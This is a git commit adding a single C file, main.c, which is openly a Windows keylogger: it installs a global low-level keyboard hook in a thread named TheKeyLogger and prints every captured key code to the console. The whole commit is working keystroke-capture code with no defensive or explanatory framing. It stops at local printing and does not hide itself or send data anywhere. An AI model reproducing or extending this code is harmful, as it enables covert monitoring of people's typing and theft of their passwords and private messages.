44b07734d383893b6f82647dfce515d36705729b
Your Name <you@example.com>
2022-03-07 07:56:35 -0300

    first commit

---
+++ main.c
@@ -0,0 +1,102 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <Windows.h>
+#define _WIN32_WINNT 0x0400
+
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM
+
+    lParam)
+
+{
+
+    BOOL fEatKeystroke = FALSE;
+
+    if (nCode == HC_ACTION)
+
+    {
+
+        switch (wParam)
+
+        {
+
+            case WM_KEYDOWN:
+
+            case WM_SYSKEYDOWN:
+
+            //case WM_KEYUP:
+
+            case WM_SYSKEYUP:
+
+                {
+
+                    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
+
+                    printf("%c", p->vkCode);
+
+                    break;
+
+                }
+
+        }
+
+    }
+
+    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam,
+
+        lParam));
+
+}
+
+void MessageLoop()
+
+{
+
+    MSG message;
+
+    while (GetMessage(&message,NULL,0,0)) {
+
+        TranslateMessage( &message );
+
+        DispatchMessage( &message );
+
+    }
+
+}
+
+DWORD WINAPI  TheKeyLogger()
+
+{
+
+    HINSTANCE hinstExe = GetModuleHandle(NULL);
+
+    HHOOK hhkLowLevelKybd  = SetWindowsHookEx(WH_KEYBOARD_LL,
+
+        LowLevelKeyboardProc, hinstExe, 0);
+
+    MessageLoop();
+
+    UnhookWindowsHookEx(hhkLowLevelKybd);
+
+    return(0);
+
+}
+
+int main(int argc, char **argv)
+
+{
+
+    HANDLE hThread;
+
+    DWORD dwThread;
+    hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)
+
+        TheKeyLogger, (LPVOID) argv[0], NULL, &dwThread);
+
+    if (hThread)
+
+        return WaitForSingleObject(hThread,INFINITE);
+
+    else return 1;
+
+}
